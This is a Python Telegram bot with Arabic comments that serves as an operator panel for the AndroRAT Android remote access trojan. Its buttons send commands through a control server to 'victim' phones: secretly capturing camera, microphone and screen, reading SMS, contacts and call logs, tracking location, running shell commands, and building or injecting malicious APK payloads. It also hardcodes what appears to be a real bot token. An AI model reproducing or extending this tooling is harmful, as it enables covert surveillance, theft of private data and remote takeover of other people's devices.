import logging
import paramiko
import json
import os
from datetime import datetime
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CallbackQueryHandler, CommandHandler, ContextTypes, MessageHandler, filters
import requests # لاستخدامها في التواصل مع سيرفر التحكم
import threading
from flask import Flask
# إعداد تسجيل الدخول لعرض الأخطاء
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# استبدل "YOUR_TOKEN" بالتوكن الخاص ببوتك
TELEGRAM_BOT_TOKEN = "8137294255:AAGg-IvJeog6BRp4a3SGJEgk2LAL3vyhUHQ"

# قائمة بمعرفات المستخدمين المصرح لهم (Telegram User IDs)
# يمكنك الحصول على معرف المستخدم الخاص بك عن طريق إرسال رسالة إلى بوت مثل @userinfobot
AUTHORIZED_USERS = [6739263320] # استبدل هذه الأرقام بمعرفات المستخدمين الفعلية

# إعدادات SSH - يجب تعديلها حسب إعدادك (لم تعد تستخدم مباشرة للتحكم في AndroRAT، ولكن قد تحتاجها للسيرفر)
SSH_CONFIG = {
    "hostname": "192.168.1.100",  # عنوان IP لجهاز Termux
    "port": 8022,                 # منفذ SSH
    "username": "your_username",  # اسم المستخدم في Termux
    "key_filename": "/path/to/private/key",  # مسار المفتاح الخاص (اختياري)
    "password": None,             # كلمة المرور (اختياري، استخدم إما المفتاح أو كلمة المرور)
}

# مسار ملف قاعدة بيانات الأجهزة
DEVICES_DB_PATH = "devices.json"

# عنوان سيرفر التحكم (يجب أن يكون قابلاً للوصول من مكان تشغيل البوت)
CONTROL_SERVER_URL = "http://127.0.0.1:8080" # مثال: http://your_server_ip:8080

# التوقيع المزخرف
SIGNATURE = "\n\n_*{•••♕آلَشـبّــ💀ـح.sx•••}*_"

# --- Flask Web Server للحفاظ على Port مفتوح على Render ---
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running"

class DeviceManager:
    """فئة لإدارة قاعدة بيانات الأجهزة"""
    def __init__(self, db_path):
        self.db_path = db_path
        self.ensure_db_exists()
    
    def ensure_db_exists(self):
        """التأكد من وجود ملف قاعدة البيانات"""
        if not os.path.exists(self.db_path):
            with open(self.db_path, 'w') as f:
                json.dump([], f)
    
    def load_devices(self):
        """تحميل قائمة الأجهزة من قاعدة البيانات"""
        try:
            with open(self.db_path, 'r') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"خطأ في تحميل قاعدة البيانات: {e}")
            return []
    
    def save_devices(self, devices):
        """حفظ قائمة الأجهزة في قاعدة البيانات"""
        try:
            with open(self.db_path, 'w') as f:
                json.dump(devices, f, indent=2, ensure_ascii=False)
            return True
        except Exception as e:
            logger.error(f"خطأ في حفظ قاعدة البيانات: {e}")
            return False
    
    def add_device(self, device_info):
        """إضافة جهاز جديد"""
        devices = self.load_devices()
        
        # التحقق من عدم وجود الجهاز مسبقاً
        for device in devices:
            if device.get('id') == device_info.get('id'):
                return False, "الجهاز موجود مسبقاً"
        
        # إضافة معلومات إضافية
        device_info['added_at'] = datetime.now().isoformat()
        device_info['last_seen'] = datetime.now().isoformat()
        device_info['status'] = 'online'
        
        devices.append(device_info)
        
        if self.save_devices(devices):
            return True, "تم إضافة الجهاز بنجاح"
        else:
            return False, "فشل في حفظ الجهاز"
    
    def remove_device(self, device_id):
        """حذف جهاز"""
        devices = self.load_devices()
        original_count = len(devices)
        
        devices = [d for d in devices if d.get('id') != device_id]
        
        if len(devices) < original_count:
            if self.save_devices(devices):
                return True, "تم حذف الجهاز بنجاح"
            else:
                return False, "فشل في حفظ التغييرات"
        else:
            return False, "الجهاز غير موجود"
    
    def update_device_status(self, device_id, status):
        """تحديث حالة الجهاز"""
        devices = self.load_devices()
        
        for device in devices:
            if device.get('id') == device_id:
                device['status'] = status
                device['last_seen'] = datetime.now().isoformat()
                break
        
        return self.save_devices(devices)
    
    def get_device_list_text(self):
        """الحصول على نص قائمة الأجهزة"""
        devices = self.load_devices()
        
        if not devices:
            return "لا توجد أجهزة متصلة حالياً."
        
        text = "📱 الأجهزة المتصلة:\n\n"
        
        for i, device in enumerate(devices, 1):
            status_emoji = "🟢" if device.get('status') == 'online' else "🔴"
            text += f"{i}. {status_emoji} {device.get('name', 'جهاز غير معروف')}\n"
            text += f"   🆔 المعرف: {device.get('id', 'غير محدد')}\n"
            text += f"   📍 IP: {device.get('ip', 'غير محدد')}\n"
            text += f"   ⏰ آخر اتصال: {device.get('last_seen', 'غير محدد')}\n\n"
        
        return text


# إنشاء مثيل من مدير الأجهزة
device_manager = DeviceManager(DEVICES_DB_PATH)


# دالة للتحقق من صلاحية المستخدم
def is_authorized(user_id: int) -> bool:
    return user_id in AUTHORIZED_USERS


# --- لوحات المفاتيح (Keyboards) ---

def get_main_keyboard():
    keyboard = [
        [
            InlineKeyboardButton("🧠 التحكم بالجهاز المصاب", callback_data='device_control_menu'),
        ],
        [
            InlineKeyboardButton("⚙️ أوامر نظامية وتحكم بالأداة", callback_data='system_commands_menu'),
        ],
        [
            InlineKeyboardButton("🧰 وظائف إضافية ومتقدمة", callback_data='advanced_features_menu'),
        ],
        [
            InlineKeyboardButton("🛠️ إنشاء/حقن بايلود", callback_data='payload_creation_menu'),
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_device_control_keyboard():
    keyboard = [
        [
            InlineKeyboardButton("📷 التقاط صورة", callback_data='capture_photo'),
            InlineKeyboardButton("🎤 تسجيل صوت", callback_data='record_audio'),
            InlineKeyboardButton("🎬 تسجيل فيديو", callback_data='record_video'),
        ],
        [
            InlineKeyboardButton("🖼️ التقاط لقطة شاشة", callback_data='capture_screenshot'),
            InlineKeyboardButton("📂 تصفح الملفات", callback_data='browse_files'),
            InlineKeyboardButton("📥 تنزيل ملف", callback_data='download_file'),
        ],
        [
            InlineKeyboardButton("📤 رفع ملف", callback_data='upload_file'),
            InlineKeyboardButton("📍 تحديد الموقع", callback_data='get_location'),
            InlineKeyboardButton("📞 عرض المكالمات", callback_data='view_calls'),
        ],
        [
            InlineKeyboardButton("📱 عرض جهات الاتصال", callback_data='view_contacts'),
            InlineKeyboardButton("💬 قراءة الرسائل", callback_data='read_sms'),
            InlineKeyboardButton("💾 جلب التطبيقات", callback_data='get_apps'),
        ],
        [
            InlineKeyboardButton("🔍 البحث عن ملف", callback_data='search_file'),
            InlineKeyboardButton("🔊 رفع/خفض الصوت", callback_data='control_volume'),
            InlineKeyboardButton("🔒 قفل الشاشة", callback_data='lock_screen'),
        ],
        [
            InlineKeyboardButton("🔄 إعادة تشغيل", callback_data='reboot_device'),
            InlineKeyboardButton("🔕 تفعيل الصمت", callback_data='silent_mode'),
        ],
        [
            InlineKeyboardButton("🔙 رجوع", callback_data='back_to_main'),
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_system_commands_keyboard():
    keyboard = [
        [
            InlineKeyboardButton("🟢 تشغيل السيرفر", callback_data='start_server'),
            InlineKeyboardButton("🔴 إيقاف السيرفر", callback_data='stop_server'),
        ],
        [
            InlineKeyboardButton("👁️‍🗨️ عرض الأجهزة", callback_data='view_devices'),
            InlineKeyboardButton("🧹 حذف الضحية", callback_data='delete_victim'),
        ],
        [
            InlineKeyboardButton("💻 تنفيذ أمر Shell", callback_data='execute_shell'),
            InlineKeyboardButton("🔁 تحديث القائمة", callback_data='refresh_list'),
        ],
        [
            InlineKeyboardButton("🔙 رجوع", callback_data='back_to_main'),
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_advanced_features_keyboard():
    keyboard = [
        [
            InlineKeyboardButton("🧱 نقل مجلد", callback_data='transfer_folder'),
            InlineKeyboardButton("📆 جدولة أمر", callback_data='schedule_command'),
        ],
        [
            InlineKeyboardButton("🎯 Geofencing", callback_data='geofencing'),
            InlineKeyboardButton("👀 مراقبة تطبيق", callback_data='monitor_app'),
        ],
        [
            InlineKeyboardButton("🆘 زر الطوارئ", callback_data='emergency_button'),
            InlineKeyboardButton("🧾 سجل الأوامر", callback_data='command_log'),
        ],
        [
            InlineKeyboardButton("🔙 رجوع", callback_data='back_to_main'),
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_payload_creation_keyboard():
    keyboard = [
        [
            InlineKeyboardButton("✨ إنشاء بايلود جديد", callback_data='create_new_payload'),
        ],
        [
            InlineKeyboardButton("💉 تعديل تطبيق لحقن البايلود", callback_data='inject_payload_into_app'),
        ],
        [
            InlineKeyboardButton("🔙 رجوع", callback_data='back_to_main'),
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_device_selection_keyboard():
    """إنشاء لوحة مفاتيح لاختيار الأجهزة"""
    devices = device_manager.load_devices()
    keyboard = []
    
    for device in devices:
        status_emoji = "🟢" if device.get('status') == 'online' else "🔴"
        button_text = f"{status_emoji} {device.get('name', 'جهاز غير معروف')}"
        callback_data = f"select_device_{device.get('id')}"
        keyboard.append([InlineKeyboardButton(button_text, callback_data=callback_data)])
    
    # إضافة زر العودة
    keyboard.append([InlineKeyboardButton("🔙 العودة", callback_data='back_to_main')])
    
    return InlineKeyboardMarkup(keyboard)


# --- أوامر AndroRAT (محاكاة) ---

def get_action_description(action):
    descriptions = {
        'capture_photo': 'جاري التقاط صورة من الكاميرا الأمامية أو الخلفية...', 
        'record_audio': 'جاري تفعيل المايكروفون وتسجيل مقطع صوتي...', 
        'record_video': 'جاري بدء تسجيل فيديو من الكاميرا...', 
        'capture_screenshot': 'جاري أخذ Screenshot من جهاز الضحية...', 
        'browse_files': 'جاري تصفح ملفات جهاز الضحية (File Manager)...', 
        'download_file': 'جاري تحضير تحميل ملف من الجهاز إلى السيرفر...', 
        'upload_file': 'جاري تحضير إرسال ملف من السيرفر إلى الجهاز...', 
        'get_location': 'جاري جلب إحداثيات GPS للجهاز...', 
        'view_calls': 'جاري عرض سجل المكالمات الصادرة والواردة...', 
        'view_contacts': 'جاري استخراج جهات الاتصال Contacts...', 
        'read_sms': 'جاري جلب الرسائل SMS من الجهاز...', 
        'get_apps': 'جاري جلب قائمة التطبيقات المثبتة على الجهاز...', 
        'search_file': 'جاري البحث داخل الجهاز عن ملف باسم معين...', 
        'control_volume': 'جاري التحكم بمستوى الصوت...', 
        'lock_screen': 'جاري قفل شاشة جهاز الضحية...', 
        'reboot_device': 'جاري تنفيذ إعادة تشغيل للجهاز...', 
        'silent_mode': 'جاري تحويل الجهاز إلى الوضع الصامت...', 
        'start_server': 'جاري تشغيل سيرفر التحكم...', 
        'stop_server': 'جاري إيقاف سيرفر التحكم...', 
        'view_devices': 'جاري عرض قائمة الأجهزة المتصلة...', 
        'execute_shell': 'جاري إرسال أمر وتنفيذه في الجهاز...', 
        'delete_victim': 'جاري حذف جهاز من السيرفر...', 
        'refresh_list': 'جاري تحديث عرض الأجهزة والمعلومات...', 
        'transfer_folder': 'جاري نقل مجلدات كاملة...', 
        'schedule_command': 'جاري جدولة أمر لتنفيذه في وقت محدد...', 
        'geofencing': 'جاري إعداد تنبيه عند دخول/خروج من موقع...', 
        'monitor_app': 'جاري إعداد التقاط صورة عند فتح تطبيق معين...', 
        'emergency_button': 'جاري تفعيل تنبيه في حالة استغاثة من الضحية...', 
        'command_log': 'جاري عرض أرشيف كل الأوامر المرسلة من البوت...', 
        'create_new_payload': 'جاري إعداد لإنشاء بايلود APK جديد...', 
        'inject_payload_into_app': 'جاري إعداد لحقن بايلود في تطبيق APK موجود...', 
    }
    return descriptions.get(action, 'جاري تنفيذ العملية المطلوبة...')


# --- دوال معالجة الأوامر والضغطات ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """إرسال رسالة مع لوحة التحكم عند تنفيذ الأمر /start."""
    user = update.effective_user
    
    if not is_authorized(user.id):
        await update.message.reply_text("عذراً، أنت غير مصرح لك باستخدام هذا البوت." + SIGNATURE)
        return
        
    device_count = len(device_manager.load_devices())
    
    await update.message.reply_html(
        f"أهلاً بك يا {user.mention_html()} في لوحة تحكم AndroRAT 🎮\n\n"
        f"الحالة: متصل بسيرفر التحكم على {CONTROL_SERVER_URL}\n"
        f"عدد الأجهزة المتصلة: {device_count}" + SIGNATURE,
        reply_markup=get_main_keyboard(),
    )


async def add_device(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """إضافة جهاز جديد (للاختبار اليدوي)."""
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("عذراً، أنت غير مصرح لك باستخدام هذا البوت." + SIGNATURE)
        return

    if not context.args or len(context.args) < 3:
        await update.message.reply_text(
            "الاستخدام: /add_device <معرف_الجهاز> <اسم_الجهاز> <عنوان_IP>\n"
            "مثال: /add_device victim001 \"هاتف أحمد\" 192.168.1.50" + SIGNATURE
        )
        return
    
    device_id = context.args[0]
    device_name = context.args[1]
    device_ip = context.args[2]
    
    device_info = {
        'id': device_id,
        'name': device_name,
        'ip': device_ip
    }
    
    success, message = device_manager.add_device(device_info)
    
    if success:
        await update.message.reply_text(f"✅ {message}" + SIGNATURE)
    else:
        await update.message.reply_text(f"❌ {message}" + SIGNATURE)


async def handle_payload_creation_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """معالجة إدخال IP والمنفذ لإنشاء بايلود جديد."""
    user_input = update.message.text.strip()
    chat_id = update.effective_chat.id

    if 'waiting_for_payload_ip_port' not in context.user_data:
        return # ليس في حالة انتظار إدخال

    try:
        ip, port_str = user_input.split(':')
        port = int(port_str)
        if not (0 <= port <= 65535):
            raise ValueError("المنفذ يجب أن يكون بين 0 و 65535.")
        
        del context.user_data['waiting_for_payload_ip_port']
        context.user_data['current_payload_chat_id'] = chat_id # لتوجيه تحديثات التقدم

        await update.message.reply_text(
            f"جاري إنشاء بايلود جديد لـ {ip}:{port}...\n\nيرجى الانتظار، هذه العملية قد تستغرق بعض الوقت." + SIGNATURE
        )
        
        # إرسال الطلب إلى سيرفر التحكم
        try:
            response = requests.post(
                f"{CONTROL_SERVER_URL}/build_apk",
                json={'ip': ip, 'port': port, 'chat_id': chat_id}
            )
            response.raise_for_status() # ترفع استثناء للأخطاء 4xx/5xx
            result = response.json()
            
            if result.get('status') == 'success':
                # السيرفر سيرسل الملف مباشرة إلى البوت
                await update.message.reply_text("✅ تم بدء عملية بناء البايلود بنجاح على السيرفر. ستصلك تحديثات قريباً." + SIGNATURE)
            else:
                await update.message.reply_text(f"❌ فشل بدء عملية بناء البايلود: {result.get('message', 'خطأ غير معروف')}" + SIGNATURE)
        except requests.exceptions.RequestException as e:
            await update.message.reply_text(f"❌ خطأ في الاتصال بسيرفر التحكم: {e}" + SIGNATURE)

    except ValueError as e:
        await update.message.reply_text(f"❌ تنسيق خاطئ. يرجى إدخال IP:Port (مثال: 192.168.1.1:8080). {e}" + SIGNATURE)
    except Exception as e:
        await update.message.reply_text(f"❌ حدث خطأ غير متوقع: {e}" + SIGNATURE)

    # إعادة عرض لوحة التحكم الرئيسية بعد معالجة الإدخال
    await update.message.reply_text(
        text="🎮 لوحة التحكم الرئيسية:" + SIGNATURE,
        reply_markup=get_main_keyboard()
    )


async def handle_apk_injection_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """معالجة ملف APK المرسل لحقن البايلود."""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    if not is_authorized(user_id):
        await update.message.reply_text("عذراً، أنت غير مصرح لك باستخدام هذا البوت." + SIGNATURE)
        return

    if 'waiting_for_apk_file' not in context.user_data:
        return # ليس في حالة انتظار ملف

    if update.message.document and update.message.document.file_name.endswith('.apk'):
        file_id = update.message.document.file_id
        file_name = update.message.document.file_name
        new_file = await context.bot.get_file(file_id)
        
        # حفظ الملف مؤقتاً
        temp_apk_path = os.path.join("temp_apks", file_name)
        os.makedirs("temp_apks", exist_ok=True)
        await new_file.download_to_drive(temp_apk_path)
        
        del context.user_data['waiting_for_apk_file']
        context.user_data['current_payload_chat_id'] = chat_id # لتوجيه تحديثات التقدم

        await update.message.reply_text(
            f"جاري تحليل وحقن البايلود في '{file_name}'...\n\nيرجى الانتظار، هذه العملية قد تستغرق بعض الوقت." + SIGNATURE
        )

        # إرسال الطلب إلى سيرفر التحكم
        try:
            with open(temp_apk_path, 'rb') as f:
                response = requests.post(
                    f"{CONTROL_SERVER_URL}/inject_apk",
                    files={'apk_file': f},
                    data={'chat_id': chat_id}
                )
            response.raise_for_status()
            result = response.json()

            if result.get('status') == 'success':
                await update.message.reply_text("✅ تم بدء عملية حقن البايلود بنجاح على السيرفر. ستصلك تحديثات قريباً." + SIGNATURE)
            else:
                await update.message.reply_text(f"❌ فشل بدء عملية حقن البايلود: {result.get('message', 'خطأ غير معروف')}" + SIGNATURE)
        except requests.exceptions.RequestException as e:
            await update.message.reply_text(f"❌ خطأ في الاتصال بسيرفر التحكم: {e}" + SIGNATURE)
        finally:
            os.remove(temp_apk_path) # حذف الملف المؤقت

    else:
        await update.message.reply_text("❌ يرجى إرسال ملف APK صالح." + SIGNATURE)

    # إعادة عرض لوحة التحكم الرئيسية بعد معالجة الإدخال
    await update.message.reply_text(
        text="🎮 لوحة التحكم الرئيسية:" + SIGNATURE,
        reply_markup=get_main_keyboard()
    )


async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """تحليل الضغطات على الأزرار والرد عليها."""
    query = update.callback_query
    
    if not is_authorized(query.from_user.id):
        await query.answer("عذراً، أنت غير مصرح لك باستخدام هذا البوت.")
        await query.edit_message_text("عذراً، أنت غير مصرح لك باستخدام هذا البوت." + SIGNATURE)
        return

    await query.answer()  # مهم لإعلام تيليجرام بأن الضغطة استُلمت

    command = query.data
    
    # معالجة أوامر التنقل بين القوائم
    if command == 'device_control_menu':
        await query.edit_message_text(
            text="🧠 التحكم بالجهاز المصاب:\n\nاختر الإجراء المطلوب:" + SIGNATURE,
            reply_markup=get_device_control_keyboard()
        )
        return
    elif command == 'system_commands_menu':
        await query.edit_message_text(
            text="⚙️ أوامر نظامية وتحكم بالأداة:\n\nاختر الإجراء المطلوب:" + SIGNATURE,
            reply_markup=get_system_commands_keyboard()
        )
        return
    elif command == 'advanced_features_menu':
        await query.edit_message_text(
            text="🧰 وظائف إضافية ومتقدمة:\n\nاختر الإجراء المطلوب:" + SIGNATURE,
            reply_markup=get_advanced_features_keyboard()
        )
        return
    elif command == 'payload_creation_menu':
        await query.edit_message_text(
            text="🛠️ إنشاء/حقن بايلود:\n\nاختر نوع البايلود:" + SIGNATURE,
            reply_markup=get_payload_creation_keyboard()
        )
        return
    elif command == 'back_to_main':
        # مسح أي حالات انتظار سابقة
        context.user_data.pop('waiting_for_payload_ip_port', None)
        context.user_data.pop('waiting_for_apk_file', None)
        await query.edit_message_text(
            text="🎮 لوحة التحكم الرئيسية:" + SIGNATURE,
            reply_markup=get_main_keyboard()
        )
        return
    
    # معالجة أوامر إنشاء/حقن البايلود
    elif command == 'create_new_payload':
        context.user_data['waiting_for_payload_ip_port'] = True
        await query.edit_message_text(
            text="✨ لإنشاء بايلود جديد، يرجى إدخال IP:Port الخاص بسيرفر التحكم (مثال: 192.168.1.1:8080):" + SIGNATURE,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔙 رجوع", callback_data='payload_creation_menu')
            ]])
        )
        return
    elif command == 'inject_payload_into_app':
        context.user_data['waiting_for_apk_file'] = True
        await query.edit_message_text(
            text="💉 يرجى إرسال ملف APK الذي ترغب في حقن البايلود فيه:" + SIGNATURE,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔙 رجوع", callback_data='payload_creation_menu')
            ]])
        )
        return

    # معالجة أوامر خاصة بإدارة الأجهزة
    if command == 'view_devices':
        device_list_text = device_manager.get_device_list_text()
        await query.edit_message_text(
            text=device_list_text + SIGNATURE,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔙 رجوع", callback_data='system_commands_menu')
            ]])
        )
        return
    
    elif command == 'delete_victim':
        await query.edit_message_text(
            text="اختر الجهاز المراد حذفه:" + SIGNATURE,
            reply_markup=get_device_selection_keyboard()
        )
        return
    
    elif command.startswith('select_device_'):
        device_id = command.replace('select_device_', '')
        success, message = device_manager.remove_device(device_id)
        
        if success:
            await query.edit_message_text(f"✅ {message}" + SIGNATURE)
        else:
            await query.edit_message_text(f"❌ {message}" + SIGNATURE)
        
        # إعادة عرض لوحة التحكم الرئيسية بعد ثانيتين
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text="🎮 لوحة التحكم الرئيسية:" + SIGNATURE,
            reply_markup=get_main_keyboard()
        )
        return
    
    # معالجة الأوامر العادية التي تتطلب تفاعلاً مع سيرفر التحكم
    description = get_action_description(command)
    await query.edit_message_text(text=f"{description}\n\nيرجى الانتظار..." + SIGNATURE)
    
    # إرسال الأمر إلى سيرفر التحكم
    try:
        response = requests.post(
            f"{CONTROL_SERVER_URL}/execute_command",
            json={'command': command, 'chat_id': query.message.chat_id}
        )
        response.raise_for_status() # ترفع استثناء للأخطاء 4xx/5xx
        result = response.json()
        
        if result.get('status') == 'success':
            response_text = f"✅ تم إرسال الأمر بنجاح إلى سيرفر التحكم.\n\nالنتيجة: {result.get('message', 'لا توجد رسالة')}"
        else:
            response_text = f"❌ فشل إرسال الأمر إلى سيرفر التحكم: {result.get('message', 'خطأ غير معروف')}"
    except requests.exceptions.RequestException as e:
        response_text = f"❌ خطأ في الاتصال بسيرفر التحكم: {e}"

    # تحديد الحد الأقصى لطول الرسالة (تيليجرام يحدد 4096 حرف)
    if len(response_text) > 4000:
        response_text = response_text[:4000] + "\n\n... (تم اقتطاع النتيجة)"
    
    # إرسال النتيجة
    await context.bot.send_message(
        chat_id=query.message.chat_id,
        text=response_text + SIGNATURE
    )
    
    # إعادة عرض لوحة التحكم الرئيسية
    await context.bot.send_message(
        chat_id=query.message.chat_id,
        text="🎮 لوحة التحكم الرئيسية:" + SIGNATURE,
        reply_markup=get_main_keyboard()
    )


# --- دوال معالجة تحديثات سيرفر التحكم (Webhook) ---

async def handle_server_update(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """معالجة التحديثات المرسلة من سيرفر التحكم."""
    # هذه الدالة ستُستدعى بواسطة Webhook من سيرفر التحكم
    # يجب أن يكون البوت قادراً على استقبال Webhooks
    # في هذا السياق، سنقوم بمحاكاة استقبال التحديثات
    # في التطبيق الحقيقي، ستحتاج إلى إعداد Webhook في تيليجرام

    # مثال على كيفية استقبال البيانات من السيرفر
    # data = update.message.text # أو update.message.json_data إذا كان JSON
    # logger.info(f"Received update from server: {data}")

    # هنا، سنفترض أن السيرفر يرسل رسائل مباشرة إلى البوت
    # لذا، هذه الدالة قد لا تكون ضرورية إذا كان السيرفر يستخدم API تيليجرام مباشرة
    pass


def main() -> None:
    """تشغيل البوت."""
    # إنشاء التطبيق وربطه بالتوكن
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # إضافة معالجات الأوامر والضغطات
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("add_device", add_device))
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # معالج لرسائل النص (لإدخال IP:Port)
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_payload_creation_input))
    
    # معالج لملفات APK
    application.add_handler(MessageHandler(filters.Document.MimeType("application/vnd.android.package-archive"), handle_apk_injection_file))

    # بدء تشغيل البوت
    application.run_polling()


if __name__ == "__main__":
    # تشغيل Flask في Thread منفصل حتى يبقى البورت مفتوحًا على Render
    threading.Thread(
        target=lambda: app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
    ).start()

    # تشغيل البوت
    main()
